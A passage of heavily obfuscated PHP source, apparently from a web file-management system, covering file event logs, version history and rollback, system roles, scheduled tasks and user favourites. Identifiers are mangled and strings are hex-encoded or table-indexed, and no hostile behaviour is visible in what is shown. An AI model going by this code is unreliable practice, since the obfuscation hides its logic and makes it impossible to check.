$²­¾Ëï…[32] => $Ñ†±³‡¨[$²­¾Ëï…[32]]); return $this->addEvent($‘å÷ºÇÔ, $²­¾Ëï…[2121], $°ï¤İªĞ); } public function eventFileEdit($ƒµÚ”¡™) { $÷ÛŞ‚ı¬ =& $_SERVER[Ö†ØøÖ±]; $¨ õÈÔ = array($÷ÛŞ‚ı¬[2128] => $_SERVER[$÷ÛŞ‚ı¬[2129]], $÷ÛŞ‚ı¬[2130] => strtolower(ACTION)); if (isset($GLOBALS[$÷ÛŞ‚ı¬[7]][$÷ÛŞ‚ı¬[2131]])) { $¨ õÈÔ[$÷ÛŞ‚ı¬[2131]] = $÷ÛŞ‚ı¬[88]; } return $this->addEvent($ƒµÚ”¡™, $÷ÛŞ‚ı¬[1867], $¨ õÈÔ); } public function eventRecycle($ÈØ©ÖüÚ, $âÆ¢«ıˆ) { return $this->addEvent($ÈØ©ÖüÚ, $_SERVER[Ö†ØøÖ±][2123], $âÆ¢«ıˆ); } public function eventRemove($æËğ³õ) { $ğ…öàÆ‰ =& $_SERVER[Ö†ØøÖ±]; $²¥©«äÌ = Model($ğ…öàÆ‰[1385])->sourceInfo($æËğ³õ); $¨Ó¹ˆÎ‘ = $²¥©«äÌ[$ğ…öàÆ‰[32]]; return $this->addEvent($²¥©«äÌ[$ğ…öàÆ‰[180]], $ğ…öàÆ‰[1866], $¨Ó¹ˆÎ‘); } public function eventShare($ÅòéÛ¢¥, $“‡œÊŒ‹) { return $this->addEvent($ÅòéÛ¢¥, $_SERVER[Ö†ØøÖ±][1877], $“‡œÊŒ‹); } public function eventMove($ÚèÁÙÔï, $Æú®ÙëÃ, $æ´¨÷) { $½’ÊØ¦… =& $_SERVER[Ö†ØøÖ±]; $ïï°–¿€ = Model($½’ÊØ¦…[1385]); $ŞòÁßİö = $ïï°–¿€->sourceInfo($ÚèÁÙÔï); $ØÇµ¶¿Å = $ïï°–¿€->sourceInfo($Æú®ÙëÃ); $ØúŸËÔç = $ïï°–¿€->sourceInfo($æ´¨÷); $¡ßùÜ€ö = array($½’ÊØ¦…[1213] => $Æú®ÙëÃ, $½’ÊØ¦…[2132] => $ØÇµ¶¿Å[$½’ÊØ¦…[32]], $½’ÊØ¦…[2109] => !empty($ØÇµ¶¿Å[$½’ÊØ¦…[560]]) ? $ØÇµ¶¿Å[$½’ÊØ¦…[560]] : $½’ÊØ¦…[12], $½’ÊØ¦…[1214] => $æ´¨÷, $½’ÊØ¦…[2133] => $ØúŸËÔç[$½’ÊØ¦…[32]], $½’ÊØ¦…[2134] => !empty($ØúŸËÔç[$½’ÊØ¦…[560]]) ? $ØúŸËÔç[$½’ÊØ¦…[560]] : $½’ÊØ¦…[12]); $this->addEvent($ÚèÁÙÔï, $½’ÊØ¦…[597], $¡ßùÜ€ö); $ŞòÁßİö = $ïï°–¿€->sourceInfo($ÚèÁÙÔï); $¡ßùÜ€ö = array($½’ÊØ¦…[181] => $ŞòÁßİö[$½’ÊØ¦…[181]], $½’ÊØ¦…[32] => $ŞòÁßİö[$½’ÊØ¦…[32]]); $this->addEvent($Æú®ÙëÃ, $½’ÊØ¦…[2135], $¡ßùÜ€ö); } public function eventCopy($²¿Ö÷ÚŞ) { $this->eventCreate($²¿Ö÷ÚŞ, $_SERVER[Ö†ØøÖ±][595]); } public function eventRename($±¢•‘Á¿, $ÄÁº“À, $åß¢ŠëÔ) { $íäÎ˜ì² =& $_SERVER[Ö†ØøÖ±]; $˜şàÂ‚æ = array($íäÎ˜ì²[1213] => $ÄÁº“À, $íäÎ˜ì²[1214] => $åß¢ŠëÔ); return $this->addEvent($±¢•‘Á¿, $íäÎ˜ì²[1399], $˜şàÂ‚æ); } public function eventAddComment($ß„­Ó‰, $ì‡Ø‚) { return $this->addEvent($ß„­Ó‰, $_SERVER[Ö†ØøÖ±][2136], $ì‡Ø‚); } public function eventAddDesc($ƒÌ­åë“, $Ô¤¨Úû) { return $this->addEvent($ƒÌ­åë“, $_SERVER[Ö†ØøÖ±][2137], $Ô¤¨Úû); } public function listBySource($ª¦‘ï‘·) { $­ıœŒÂš =& $_SERVER[Ö†ØøÖ±]; $­ƒË¨Ó = Model($­ıœŒÂš[1385])->sourceInfo($ª¦‘ï‘·); $ä‡ï‡ = array($­ıœŒÂš[468] => $ª¦‘ï‘·); if ($­ƒË¨Ó[$­ıœŒÂš[462]] == $­ıœŒÂš[88]) { $Á÷øşÖÎ = Model($­ıœŒÂš[1385])->listSearchChildren($ª¦‘ï‘·, 20000); $Á÷øşÖÎ[] = $ª¦‘ï‘· . $­ıœŒÂš[296]; $ä‡ï‡ = array($­ıœŒÂš[181] => array($­ıœŒÂš[7], $Á÷øşÖÎ)); } $àÅµÃ³¦ = $this->where($ä‡ï‡)->order($­ıœŒÂš[2138])->selectPage(); if ($àÅµÃ³¦[$­ıœŒÂš[419]][$­ıœŒÂš[420]] == 0) { $àÅµÃ³¦[$­ıœŒÂš[419]][$­ıœŒÂš[420]] = 1; $àÅµÃ³¦[$­ıœŒÂš[422]] = array(array($­ıœŒÂš[468] => $ª¦‘ï‘·, $­ıœŒÂš[2119] => $­ƒË¨Ó[$­ıœŒÂš[180]], $­ıœŒÂš[1690] => $­ƒË¨Ó[$­ıœŒÂš[504]], $­ıœŒÂš[473] => $­ıœŒÂš[2139], $­ıœŒÂš[474] => $­ƒË¨Ó[$­ıœŒÂš[215]], $­ıœŒÂš[1692] => $­ıœŒÂš[12])); } return $this->eventListParse($àÅµÃ³¦, $ª¦‘ï‘·); } private function eventListParse($Õ»‡¥Çä, $ÊšÏ•È¯) { $×‰µØ¢ò =& $_SERVER[Ö†ØøÖ±]; $ƒ­¿Ùˆ¼ = $Õ»‡¥Çä[$×‰µØ¢ò[422]]; $ğ£¯ÚÆø = array_to_keyvalue($ƒ­¿Ùˆ¼, $×‰µØ¢ò[12], $×‰µØ¢ò[181]); $ıìÜåÕÛ = array_to_keyvalue($ƒ­¿Ùˆ¼, $×‰µØ¢ò[12], $×‰µØ¢ò[2125]); foreach ($ƒ­¿Ùˆ¼ as $‹Ÿ——Í) { $›²°ıèú = $‹Ÿ——Í[$×‰µØ¢ò[503]]; if ($‹Ÿ——Í[$×‰µØ¢ò[33]] == $×‰µØ¢ò[597] && isset($›²°ıèú[$×‰µØ¢ò[1213]])) { $ğ£¯ÚÆø[] = $›²°ıèú[$×‰µØ¢ò[1213]] . $×‰µØ¢ò[12]; $ğ£¯ÚÆø[] = $›²°ıèú[$×‰µØ¢ò[1214]] . $×‰µØ¢ò[12]; } if ($‹Ÿ——Í[$×‰µØ¢ò[33]] == $×‰µØ¢ò[2135] && isset($›²°ıèú[$×‰µØ¢ò[181]])) { $ğ£¯ÚÆø[] = $›²°ıèú[$×‰µØ¢ò[181]] . $×‰µØ¢ò[12]; } } $ğ£¯ÚÆø = array_merge($ğ£¯ÚÆø, $ıìÜåÕÛ, array($ÊšÏ•È¯ . $×‰µØ¢ò[12])); $ğ£¯ÚÆø = array_unique($ğ£¯ÚÆø); $´Â½îˆ˜ = array_unique(array_to_keyvalue($ƒ­¿Ùˆ¼, $×‰µØ¢ò[12], $×‰µØ¢ò[1699])); $íÀ•Ø˜¤ = Model($×‰µØ¢ò[576])->userListInfo($´Â½îˆ˜); $†ÜÊÒ¾¨ = Model($×‰µØ¢ò[878])->sourceListInfo($ğ£¯ÚÆø, !0); foreach ($ƒ­¿Ùˆ¼ as &$‹Ÿ——Í) { if ($‹Ÿ——Í[$×‰µØ¢ò[33]] == $×‰µØ¢ò[597] && isset($‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[1213]])) { $‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[1213]] = $†ÜÊÒ¾¨[$‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[1213]]]; $‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[1214]] = $†ÜÊÒ¾¨[$‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[1214]]]; } if ($‹Ÿ——Í[$×‰µØ¢ò[33]] == $×‰µØ¢ò[2135] && isset($‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[181]])) { $‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[181]] = $†ÜÊÒ¾¨[$‹Ÿ——Í[$×‰µØ¢ò[503]][$×‰µØ¢ò[181]]]; } $‹Ÿ——Í[$×‰µØ¢ò[87]] = $†ÜÊÒ¾¨[$‹Ÿ——Í[$×‰µØ¢ò[181]]]; $‹Ÿ——Í[$×‰µØ¢ò[2140]] = $†ÜÊÒ¾¨[$‹Ÿ——Í[$×‰µØ¢ò[2125]]]; if ($‹Ÿ——Í[$×‰µØ¢ò[33]] == $×‰µØ¢ò[1866]) { $‹Ÿ——Í[$×‰µØ¢ò[2140]] = $‹Ÿ——Í[$×‰µØ¢ò[87]]; $‹Ÿ——Í[$×‰µØ¢ò[2125]] = $‹Ÿ——Í[$×‰µØ¢ò[2140]][$×‰µØ¢ò[181]]; $‹Ÿ——Í[$×‰µØ¢ò[87]] = !1; $‹Ÿ——Í[$×‰µØ¢ò[181]] = $×‰µØ¢ò[12]; } $‹Ÿ——Í[$×‰µØ¢ò[2069]] = $íÀ•Ø˜¤[$‹Ÿ——Í[$×‰µØ¢ò[1699]]]; } unset($‹Ÿ——Í); $Õ»‡¥Çä[$×‰µØ¢ò[422]] = $ƒ­¿Ùˆ¼; return $Õ»‡¥Çä; } public function removeBySource($€ëß—£ã) { $Ô÷ŸâÍ = array($_SERVER[Ö†ØøÖ±][468] => $€ëß—£ã); $this->where($Ô÷ŸâÍ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\143\145\137\x68\151\163\164\157\162\x79"; public function historyCount($ˆíîà‹) { $˜Ù˜°± =& $_SERVER[Ö†ØøÖ±]; if (!$ˆíîà‹) { return array(); } if (is_string($ˆíîà‹) || is_int($ˆíîà‹)) { $ˆíîà‹ = array($ˆíîà‹); } $âÂöÕıÒ = array($˜Ù˜°±[181], $˜Ù˜°±[1930] => $˜Ù˜°±[542]); $¸³‡‘áÁ = array($˜Ù˜°±[181] => array($˜Ù˜°±[7], $ˆíîà‹)); $Ğ€åÇ¾Å = $this->field($âÂöÕıÒ)->where($¸³‡‘áÁ)->group($˜Ù˜°±[181])->select(); return array_to_keyvalue($Ğ€åÇ¾Å, $˜Ù˜°±[181], $˜Ù˜°±[542]); } public function addHistory($ô¦ŞÁÇ, $¬ïÙ‘¶ = '') { $Œ¿“åî =& $_SERVER[Ö†ØøÖ±]; $²ä¾Èõ = array($Œ¿“åî[468] => $ô¦ŞÁÇ[$Œ¿“åî[181]], $Œ¿“åî[1690] => isset($ô¦ŞÁÇ[$Œ¿“åî[506]]) ? $ô¦ŞÁÇ[$Œ¿“åî[506]] : $ô¦ŞÁÇ[$Œ¿“åî[504]], $Œ¿“åî[519] => $ô¦ŞÁÇ[$Œ¿“åî[518]], $Œ¿“åî[594] => $ô¦ŞÁÇ[$Œ¿“åî[76]], $Œ¿“åî[2141] => $¬ïÙ‘¶); if ($GLOBALS[$Œ¿“åî[6]][$Œ¿“åî[89]][$Œ¿“åî[1270]] >= 1) { $this->historyAutoClear($²ä¾Èõ[$Œ¿“åî[181]]); $this->add($²ä¾Èõ); } Hook::trigger($Œ¿“åî[2142], $²ä¾Èõ); Model($Œ¿“åî[2143])->eventFileEdit($ô¦ŞÁÇ[$Œ¿“åî[181]]); } private function historyAutoClear($¢ÅÕ£ÅŞ) { $½ÎùÕ—ò =& $_SERVER[Ö†ØøÖ±]; $¯Ü”‹“ˆ = Model($½ÎùÕ—ò[823])->get($½ÎùÕ—ò[1292]); $¢£áá¤ = $GLOBALS[$½ÎùÕ—ò[6]][$½ÎùÕ—ò[89]][$½ÎùÕ—ò[1270]]; $™‰ƒ»ÛÈ = $¯Ü”‹“ˆ == $½ÎùÕ—ò[1293] ? min(5, $¢£áá¤) : $¢£áá¤; $™‰ƒ»ÛÈ = $™‰ƒ»ÛÈ <= 0 ? 0 : $™‰ƒ»ÛÈ - 1; if ($™‰ƒ»ÛÈ >= 500) { return; } $›úÊ„’ = array($½ÎùÕ—ò[468] => $¢ÅÕ£ÅŞ); $Ÿ»ïúõş = $this->field($½ÎùÕ—ò[2144])->where($›úÊ„’)->order($½ÎùÕ—ò[2138])->select(); if (!$Ÿ»ïúõş || $™‰ƒ»ÛÈ >= count($Ÿ»ïúõş)) { return; } $ƒÅ¬‹£ = array_to_keyvalue($Ÿ»ïúõş, $½ÎùÕ—ò[12], $½ÎùÕ—ò[451]); $ƒÅ¬‹£ = array_slice($ƒÅ¬‹£, $™‰ƒ»ÛÈ); $ŸäŸıù = array_to_keyvalue($Ÿ»ïúõş, $½ÎùÕ—ò[12], $½ÎùÕ—ò[518]); $ŸäŸıù = array_slice($ŸäŸıù, $™‰ƒ»ÛÈ); if (!$ƒÅ¬‹£ || !$ŸäŸıù) { return; } $›úÊ„’ = array($½ÎùÕ—ò[470] => array($½ÎùÕ—ò[7], $ƒÅ¬‹£)); $this->where($›úÊ„’)->delete(); Model($½ÎùÕ—ò[521])->remove($ŸäŸıù); } public function listData($¯¦ºéÔ) { $ÂÅ– =& $_SERVER[Ö†ØøÖ±]; $‰“ôšêù = array($ÂÅ–[468] => $¯¦ºéÔ); $ß×«®—— = $ÂÅ–[2145]; $ŠÒ‘“¯’ = $this->field($ß×«®——)->where($‰“ôšêù)->order($ÂÅ–[2138])->selectPage(); $this->_listAppendUser($ŠÒ‘“¯’[$ÂÅ–[422]]); $‰‚ÊÇş = Model($ÂÅ–[823])->get($ÂÅ–[1292]); $´Çıä¥Ş = 5; if ($‰‚ÊÇş == $ÂÅ–[1293]) { $ŠÒ‘“¯’[$ÂÅ–[422]] = array_slice($ŠÒ‘“¯’[$ÂÅ–[422]], 0, $´Çıä¥Ş); $ŠÒ‘“¯’[$ÂÅ–[419]] = array($ÂÅ–[2146] => 1, $ÂÅ–[2147] => 20, $ÂÅ–[2148] => 1, $ÂÅ–[2149] => count($ŠÒ‘“¯’[$ÂÅ–[422]])); } return $ŠÒ‘“¯’; } protected function _listAppendUser(&$“ÙºÅûª) { $ïºù¾°¨ =& $_SERVER[Ö†ØøÖ±]; $ö÷áÊÆ = array_to_keyvalue($“ÙºÅûª, $ïºù¾°¨[12], $ïºù¾°¨[1699]); $××ã÷ÁÇ = Model($ïºù¾°¨[576])->userListInfo($ö÷áÊÆ); foreach ($“ÙºÅûª as &$‰Çâõİ¹) { $…ûãåˆõ = $‰Çâõİ¹[$ïºù¾°¨[1699]]; $‰Çâõİ¹[$ïºù¾°¨[504]] = $××ã÷ÁÇ[$…ûãåˆõ] ? $××ã÷ÁÇ[$…ûãåˆõ] : !1; } unset($‰Çâõİ¹); } public function fileInfo($ß„ŸŸßÀ) { $‚´òçË§ =& $_SERVER[Ö†ØøÖ±]; $¹Ù‡Ã£  = $this->tablePrefix; $Á·ôòÈ = "{$¹Ù‡Ã£ }\x69\157\x5f\146\151\x6c\145\x20\x66\151\154\x65\x73\40\x6f\156\x20\146\x69\154\x65\x73\x2e\x66\x69\x6c\x65\111\104\40\75\x20\x68\x69\163\164\x6f\162\x79\x2e\x66\x69\154\x65\111\x44"; return $this->alias($‚´òçË§[2150])->where(array($‚´òçË§[470] => $ß„ŸŸßÀ))->join($Á·ôòÈ, $‚´òçË§[2151])->find(); } public function removeItem($†ò£çıĞ) { $ú“Øµ¦ß =& $_SERVER[Ö†ØøÖ±]; $®òóÙø = array($ú“Øµ¦ß[470] => $†ò£çıĞ); $Æ‰ï¢Ëœ = $this->where($®òóÙø)->find(); if ($Æ‰ï¢Ëœ) { $ŞÔšäŠ÷ = $this->where($®òóÙø)->delete(); Model($ú“Øµ¦ß[521])->remove($Æ‰ï¢Ëœ[$ú“Øµ¦ß[518]]); return $ŞÔšäŠ÷; } return !1; } public function removeBySource($ÚÅãÔ¦…) { $ÓùŠ„êá =& $_SERVER[Ö†ØøÖ±]; if (!$ÚÅãÔ¦…) { return !1; } if (!is_array($ÚÅãÔ¦…)) { $ÚÅãÔ¦… = array($ÚÅãÔ¦…); } $Ğ»‰ÔÅñ = array($ÓùŠ„êá[468] => array($ÓùŠ„êá[7], $ÚÅãÔ¦…)); $Î³ÜõÊá = $this->field($ÓùŠ„êá[519])->where($Ğ»‰ÔÅñ)->select(); if ($Î³ÜõÊá) { $this->where($Ğ»‰ÔÅñ)->delete(); $ÚëÀœÉ· = array_to_keyvalue($Î³ÜõÊá, $ÓùŠ„êá[12], $ÓùŠ„êá[518]); Model($ÓùŠ„êá[521])->remove($ÚëÀœÉ·); } return !0; } public function setDetail($Îñší¢„, $¬³”¬Ç) { $ÇÏ˜Ïñ‘ =& $_SERVER[Ö†ØøÖ±]; return $this->where(array($ÇÏ˜Ïñ‘[470] => $Îñší¢„))->save(array($ÇÏ˜Ïñ‘[2141] => $¬³”¬Ç)); } public function rollbackToItem($€Œ äü», $èœØ¹ù¶) { $ÃòÔñË” =& $_SERVER[Ö†ØøÖ±]; $Ÿ¨ş¾”µ = Model($ÃòÔñË”[878])->sourceInfo($€Œ äü»); $this->addHistory($Ÿ¨ş¾”µ, LNG($ÃòÔñË”[2152])); $œşâûí = $this->find($èœØ¹ù¶); $¥×®Ì¬è = array($ÃòÔñË”[518] => $œşâûí[$ÃòÔñË”[518]], $ÃòÔñË”[76] => $œşâûí[$ÃòÔñË”[76]], $ÃòÔñË”[85] => time(), $ÃòÔñË”[506] => USER_ID); Model($ÃòÔñË”[878])->where(array($ÃòÔñË”[181] => $€Œ äü»))->save($¥×®Ì¬è); return $this->where(array($ÃòÔñË”[470] => $èœØ¹ù¶))->delete(); } public function clearSame($ïµñäĞÍ) { $âÑùğÛ =& $_SERVER[Ö†ØøÖ±]; $ãÂÌ«Ğ = $this->listData($ïµñäĞÍ); $İá³àôë = array_to_keyvalue_group($ãÂÌ«Ğ, $âÑùğÛ[518]); $šä„¸ = array(); $¥Á¥Ú­ = array(); foreach ($İá³àôë as $Ì•Ôí·Ù) { if (!$Ì•Ôí·Ù || count($Ì•Ôí·Ù) <= 1) { continue; } foreach ($Ì•Ôí·Ù as $ß©ıä›ò) { $šä„¸[] = $ß©ıä›ò[$âÑùğÛ[518]]; $¥Á¥Ú­[] = $ß©ıä›ò[$âÑùğÛ[451]]; } } if (!$¥Á¥Ú­) { return; } $this->where(array($âÑùğÛ[451] => array($âÑùğÛ[7], $¥Á¥Ú­)))->delete(); Model($âÑùğÛ[521])->remove($šä„¸); } public function userSpace() { $­†Ó÷¾‡ =& $_SERVER[Ö†ØøÖ±]; $àØÂè’ª = $this->tablePrefix; $øÛÌõ«ö = array($­†Ó÷¾‡[1690] => USER_ID); $Ï£åß‡¶ = "{$àØÂè’ª}\151\x6f\137\146\151\x6c\x65\x20\x66\x69\x6c\x65\163\x20\157\x6e\x20\146\151\x6c\145\163\56\146\151\x6c\x65\111\x44\x20\75\40\150\x69\x73\x74\157\162\x79\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($­†Ó÷¾‡[2150])->where($øÛÌõ«ö)->join($Ï£åß‡¶, $­†Ó÷¾‡[2151])->sum($­†Ó÷¾‡[76]); } } goto c•†§Ê÷˜“; D®Â®ˆ‚ºë: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x72\x6f\154\x65\114\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\x61\165\x74\150", "\154\x61\142\x65\x6c", "\x64\x69\x73\x70\x6c\x61\x79", "\x73\171\x73\x74\145\155", "\144\145\163\143", "\151\147\x6e\157\162\145\105\170\x74", "\151\147\156\157\162\145\x46\151\154\x65\x53\151\172\145", "\x61\x64\155\151\x6e\x69\163\x74\162\141\x74\157\162", "\163\x6f\162\x74"); public function listData($ü«Ã‡Ê = false, $åÖø²º¯ = "\x73\157\162\x74", $÷™âñ¾Ö = false) { $Ò©ûÉ¿¹ =& $_SERVER[Ö†ØøÖ±]; $Ëî±úŞ = parent::listData($ü«Ã‡Ê, $åÖø²º¯, $÷™âñ¾Ö); if (!$ü«Ã‡Ê) { foreach ($Ëî±úŞ as $ˆ¸Ø–½ƒ => $­½œïÑ) { if ($­½œïÑ[$Ò©ûÉ¿¹[2099]] == 1) { $Ëî±úŞ[$ˆ¸Ø–½ƒ][$Ò©ûÉ¿¹[503]] = LNG($Ò©ûÉ¿¹[2338]); } } } return $Ëî±úŞ; } public function update($ºŞİºâº, $ëóÕ©Â‚) { $‚±ûÎığ =& $_SERVER[Ö†ØøÖ±]; $Â‰„­Ó™ = parent::listData($ºŞİºâº); $ã–ê‹„ß = $this->findByName($ëóÕ©Â‚[$‚±ûÎığ[32]]); if (!$Â‰„­Ó™ || $ã–ê‹„ß && $ã–ê‹„ß[$‚±ûÎığ[451]] != $Â‰„­Ó™[$‚±ûÎığ[451]]) { return !1; } if ($ã–ê‹„ß[$‚±ûÎığ[2099]] == 1) { $ëóÕ©Â‚ = array($‚±ûÎığ[32] => $ëóÕ©Â‚[$‚±ûÎığ[32]], $‚±ûÎığ[1920] => $ëóÕ©Â‚[$‚±ûÎığ[1920]]); } $this->filterAuth($ëóÕ©Â‚[$‚±ûÎığ[464]]); return parent::update($ºŞİºâº, $ëóÕ©Â‚); } public function remove($Ú·çÖ«š) { $øèØ–Õ· = parent::listData($Ú·çÖ«š); if (!$øèØ–Õ· || $øèØ–Õ·[$_SERVER[Ö†ØøÖ±][179]]) { return !1; } return parent::remove($Ú·çÖ«š); } public function add($» ÏéüÖ) { $üªâöÏñ =& $_SERVER[Ö†ØøÖ±]; $ô£‡ä°· = $» ÏéüÖ[$üªâöÏñ[32]]; if ($this->findByName($ô£‡ä°·)) { return !1; } $Âïü… = array($üªâöÏñ[471] => $ô£‡ä°·, $üªâöÏñ[1903] => $üªâöÏñ[12], $üªâöÏñ[1899] => $üªâöÏñ[1907], $üªâöÏñ[2339] => 1, $üªâöÏñ[1902] => 0, $üªâöÏñ[2340] => 0, $üªâöÏñ[1901] => $this->getSort()); $» ÏéüÖ = array_merge($Âïü…, $» ÏéüÖ); $this->filterAuth($» ÏéüÖ[$üªâöÏñ[464]]); return parent::insert($» ÏéüÖ); } private function getSort() { $å¼û =& $_SERVER[Ö†ØøÖ±]; $§Ú–Æ“à = parent::listData(); $Ææ»öƒ³ = array_to_keyvalue($§Ú–Æ“à, $å¼û[12], $å¼û[1921]); return empty($Ææ»öƒ³) ? 0 : max($Ææ»öƒ³) + 1; } private function filterAuth(&$ëã£âÇ¶) { $ÆÁÍöé¬ =& $_SERVER[Ö†ØøÖ±]; $¾ñ¥¨ŞÎ = array(); $à±•ÍÛÊ = array_filter(explode($ÆÁÍöé¬[50], $ëã£âÇ¶)); foreach ($à±•ÍÛÊ as $ëã£âÇ¶) { $äÇ…ÜÚÒ = explode($ÆÁÍöé¬[10], $ëã£âÇ¶); if ($äÇ…ÜÚÒ[0] == $ÆÁÍöé¬[2341] && $äÇ…ÜÚÒ[1] != $ÆÁÍöé¬[1243]) { $øù¼×»ë = $äÇ…ÜÚÒ[0] . $ÆÁÍöé¬[10] . $äÇ…ÜÚÒ[1] . $ÆÁÍöé¬[2342]; if (!in_array($øù¼×»ë, $à±•ÍÛÊ)) { $¾ñ¥¨ŞÎ[] = $øù¼×»ë; } } $¾ñ¥¨ŞÎ[] = $ëã£âÇ¶; } $ëã£âÇ¶ = implode($ÆÁÍöé¬[50], $¾ñ¥¨ŞÎ); } public function findRoleDefault() { $‹œÌáˆÄ =& $_SERVER[Ö†ØøÖ±]; $½İ»³æ = parent::listData(); $ËìşäÇº = !1; foreach ($½İ»³æ as $Öéåâ‰Æ) { if (!$Öéåâ‰Æ || $Öéåâ‰Æ[$‹œÌáˆÄ[1919]] == $‹œÌáˆÄ[212] || $Öéåâ‰Æ[$‹œÌáˆÄ[2099]] == 1) { continue; } if (strstr($Öéåâ‰Æ[$‹œÌáˆÄ[464]], $‹œÌáˆÄ[2343])) { continue; } if (!strstr($Öéåâ‰Æ[$‹œÌáˆÄ[464]], $‹œÌáˆÄ[2344])) { continue; } if (!$ËìşäÇº) { $ËìşäÇº = $Öéåâ‰Æ; continue; } $ÆÖØ˜è† = explode($‹œÌáˆÄ[50], $ËìşäÇº[$‹œÌáˆÄ[464]]); $à©µò ü = explode($‹œÌáˆÄ[50], $Öéåâ‰Æ[$‹œÌáˆÄ[464]]); if (count($ÆÖØ˜è†) > count($à©µò ü)) { $ËìşäÇº = $Öéåâ‰Æ; } } return $ËìşäÇº ? $ËìşäÇº[$‹œÌáˆÄ[451]] : $‹œÌáˆÄ[12]; } public function sort($äûˆª¤, $«ƒ›ˆ”®) { return parent::update($äûˆª¤, $«ƒ›ˆ”®); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\164\141\163\153\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\x74\171\x70\145", "\x65\166\x65\156\164", "\164\151\155\x65", "\x64\x65\163\143", "\x73\x79\163\x74\x65\155", "\x65\156\x61\142\154\x65", "\154\141\x73\x74\122\x75\156", "\x73\x6f\162\x74"); public function listData($öÊšİı = false, $Î±”„Ìš = "\x73\x6f\x72\x74", $úĞ¨• ñ = false) { return parent::listData($öÊšİı, $Î±”„Ìš, $úĞ¨• ñ); } public function add($öì„ô˜) { $–ûø’‡Ï =& $_SERVER[Ö†ØøÖ±]; $±”ÅÉÑ³ = $this->findByName($öì„ô˜[$–ûø’‡Ï[32]]); if ($±”ÅÉÑ³) { return !1; } $öì„ô˜[$–ûø’‡Ï[1656]] = 0; $öì„ô˜[$–ûø’‡Ï[1921]] = $this->getSort(); return parent::insert($öì„ô˜); } private function getSort() { $³›åµşÅ =& $_SERVER[Ö†ØøÖ±]; $ú¹ª÷ Ù = parent::listData(); $¸‰è¢Õ¨ = array_to_keyvalue($ú¹ª÷ Ù, $³›åµşÅ[12], $³›åµşÅ[1921]); return empty($¸‰è¢Õ¨) ? 0 : max($¸‰è¢Õ¨) + 1; } public function update($ ÆÄ×ç, $ä‡±¢œí) { $‹ÃÌ¨¾­ =& $_SERVER[Ö†ØøÖ±]; $ŸÎıŒ¼Õ = $this->listData($ ÆÄ×ç); $°µÈİû¤ = $this->findByName($ä‡±¢œí[$‹ÃÌ¨¾­[32]]); if (!$ŸÎıŒ¼Õ || $°µÈİû¤ && $°µÈİû¤[$‹ÃÌ¨¾­[451]] != $ŸÎıŒ¼Õ[$‹ÃÌ¨¾­[451]]) { return !1; } return parent::update($ ÆÄ×ç, $ä‡±¢œí); } public function remove($úğâ¬§, $½Ç™¢†İ = false) { $ĞŸ¯€ôğ =& $_SERVER[Ö†ØøÖ±]; $çÙå¥Å¢ = $this->listData($úğâ¬§); if (!$çÙå¥Å¢) { return; } if (!$½Ç™¢†İ && $çÙå¥Å¢[$ĞŸ¯€ôğ[179]] == $ĞŸ¯€ôğ[88]) { return !1; } return parent::remove($úğâ¬§); } public function enable($•¾¯±Ù, $•­ÇùîÊ) { return $this->update($•¾¯±Ù, array($_SERVER[Ö†ØøÖ±][2333] => $•­ÇùîÊ)); } public function run($×Ëê½ñª) { return $this->update($×Ëê½ñª, array($_SERVER[Ö†ØøÖ±][2345] => time())); } } goto A ¿Àä¹œ“; A ¿Àä¹œ“: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\141\x76"; protected function cacheFunctionAlias($¬À¥†¸â) { $ÏÓÕåäø =& $_SERVER[Ö†ØøÖ±]; return array($ÏÓÕåäø[2008] => array(USER_ID, $ÏÓÕåäø[2346])); } protected function listData() { $ÎïªØ• =& $_SERVER[Ö†ØøÖ±]; $²ê€™Ç¸ = array($ÎïªØ•[1690] => USER_ID, $ÎïªØ•[534] => 0); $»œºø¤ü = $ÎïªØ•[2347]; $ÄßÕ‚€› = $this->field($»œºø¤ü)->where($²ê€™Ç¸)->order($ÎïªØ•[2348])->select(); return $ÄßÕ‚€› ? $ÄßÕ‚€› : array(); } protected function resetCache() { } protected function listView() { $¬•™³µ» =& $_SERVER[Ö†ØøÖ±]; $àìİİ©ç = $this->listData(); $ºëïË¿› = array_filter_by_field($àìİİ©ç, $¬•™³µ»[33], $¬•™³µ»[467]); $¨‡ŞäĞ = array_to_keyvalue($ºëïË¿›, $¬•™³µ»[12], $¬•™³µ»[84]); if (!$¨‡ŞäĞ) { return $àìİİ©ç; } $’ÕÊİ = 2000; $Í²ÑçŠ = array($¬•™³µ»[468] => array($¬•™³µ»[469], $¨‡ŞäĞ)); $½ˆÊ¶ñ‘ = Model($¬•™³µ»[878])->listSource($Í²ÑçŠ, $’ÕÊİ); $½ˆÊ¶ñ‘ = array_merge($½ˆÊ¶ñ‘[$¬•™³µ»[83]], $½ˆÊ¶ñ‘[$¬•™³µ»[82]]); $½ˆÊ¶ñ‘ = array_to_keyvalue($½ˆÊ¶ñ‘, $¬•™³µ»[181]); foreach ($àìİİ©ç as $¹‹­ÁˆÇ => $ˆÙü±ü®) { $•èÚ›ˆÖ = $½ˆÊ¶ñ‘[$ˆÙü±ü®[$¬•™³µ»[84]]]; $•èÚ›ˆÖ = $•èÚ›ˆÖ ? $•èÚ›ˆÖ : array(); $àìİİ©ç[$¹‹­ÁˆÇ] = array_merge($•èÚ›ˆÖ, $ˆÙü±ü®); } return $àìİİ©ç; } protected function addFav($À‚”’®ü, $‡ÆÏŠı‡ = '', $Ş»Ö¡ü‰ = "\x73\x6f\165\162\x63\x65") { $È”•à° =& $_SERVER[Ö†ØøÖ±]; $ıˆ€ß¹¬ = array($È”•à°[1690] => USER_ID, $È”•à°[534] => 